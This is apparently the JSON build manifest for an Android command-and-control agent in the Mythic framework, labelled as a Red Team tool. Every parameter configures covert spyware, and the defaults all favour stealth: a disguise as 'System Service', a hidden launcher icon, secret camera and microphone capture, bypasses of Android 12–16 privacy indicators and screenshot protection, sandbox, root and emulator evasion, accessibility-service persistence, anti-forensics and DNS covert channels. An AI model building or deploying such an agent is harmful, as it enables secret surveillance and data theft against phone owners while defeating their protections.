{
  "name": "mythic_android_agent",
  "author": "Red Team",
  "version": "1.0.0",
  "supported_os": ["android"],
  "wrapper": "python3",
  "description": "Advanced Android agent with stealth APK build, injection, offline logging, and multi-campaign C2 support.",
  "build_parameters": [
    {
      "name": "campaign_id",
      "description": "Unique campaign identifier",
      "type": "string",
      "default_value": "default_campaign",
      "required": true
    },
    {
      "name": "c2_profile", 
      "description": "Communication profile",
      "type": "dropdown",
      "allowed_values": ["fcm_push", "https_beacon", "dns_covert"],
      "default_value": "https_beacon"
    },
    {
      "name": "app_name",
      "description": "APK display name",
      "type": "string", 
      "default_value": "System Service"
    },
    {
      "name": "package_name",
      "description": "Android package identifier",
      "type": "string",
      "default_value": "com.android.systemservice"
    },
    {
      "name": "enable_overlay",
      "description": "Enable overlay capabilities",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "enable_frida", 
      "description": "Enable Frida injection support",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "enable_offline_logging",
      "description": "Enable offline data storage",
      "type": "boolean", 
      "default_value": true
    },
    {
      "name": "auto_hide",
      "description": "Hide app icon from launcher",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "encryption_algorithm",
      "description": "Data encryption cipher",
      "type": "dropdown",
      "allowed_values": ["AES-256-GCM", "ChaCha20-Poly1305"],
      "default_value": "AES-256-GCM"
    },
    {
      "name": "obfuscation_level",
      "description": "Code obfuscation strength", 
      "type": "dropdown",
      "allowed_values": ["none", "light", "strong"],
      "default_value": "strong"
    },
    {
      "name": "logging_interval",
      "description": "Offline logging interval in minutes",
      "type": "integer",
      "default_value": 10,
      "min": 1,
      "max": 60
    },
    {
      "name": "enable_stealth_surveillance",
      "description": "Enable stealth camera and microphone capabilities",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "bypass_privacy_indicators",
      "description": "Bypass Android 12+ privacy indicators",
      "type": "boolean", 
      "default_value": true
    },
    {
      "name": "target_android_version",
      "description": "Target Android version (12-16)",
      "type": "dropdown",
      "allowed_values": ["12", "13", "14", "15", "16"],
      "default_value": "14"
    },
    {
      "name": "enable_device_fingerprinting",
      "description": "Enable device fingerprinting for campaign isolation",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "thread_pool_size",
      "description": "Maximum concurrent module execution threads",
      "type": "integer",
      "default_value": 5,
      "min": 1,
      "max": 20
    },
    {
      "name": "enable_module_dependency_injection",
      "description": "Enable dependency injection for modules",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "config_encryption_key",
      "description": "Base64 encoded configuration encryption key",
      "type": "string",
      "default_value": "",
      "required": false
    },
    {
      "name": "android_14_privacy_bypass",
      "description": "Enable Android 14 enhanced privacy bypasses",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "android_15_partial_screenshot_protection_bypass",
      "description": "Bypass Android 15 partial screenshot protection",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "android_16_security_features_bypass",
      "description": "Bypass Android 16 new security features",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "module_load_order",
      "description": "Comma-separated list defining module loading priority",
      "type": "string",
      "default_value": "call_logger,filesystem,stealth_surveillance,overlay,frida_loader"
    },
    {
      "name": "enable_root_detection_bypass",
      "description": "Enable root detection bypass mechanisms",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "enable_emulator_detection_bypass",
      "description": "Enable emulator detection bypass mechanisms",
      "type": "boolean",
      "default_value": true
    },
    {
      "name": "sandbox_evasion_techniques",
      "description": "Comma-separated list of sandbox evasion techniques",
      "type": "string",
      "default_value": "sleep_delay,api_call_validation,user_interaction_check"
    },
    {
      "name": "stealth_persistence_method",
      "description": "Method for maintaining stealth persistence",
      "type": "dropdown",
      "allowed_values": ["device_admin", "accessibility_service", "work_profile", "system_app_disguise"],
      "default_value": "accessibility_service"
    },
    {
      "name": "anti_forensics_level",
      "description": "Level of anti-forensics measures",
      "type": "dropdown",
      "allowed_values": ["none", "basic", "advanced", "paranoid"],
      "default_value": "advanced"
    }
  ],
  "docker_image": "mythic_android_agent:latest",
  "entry_point": "builder/build_apk.py"
}
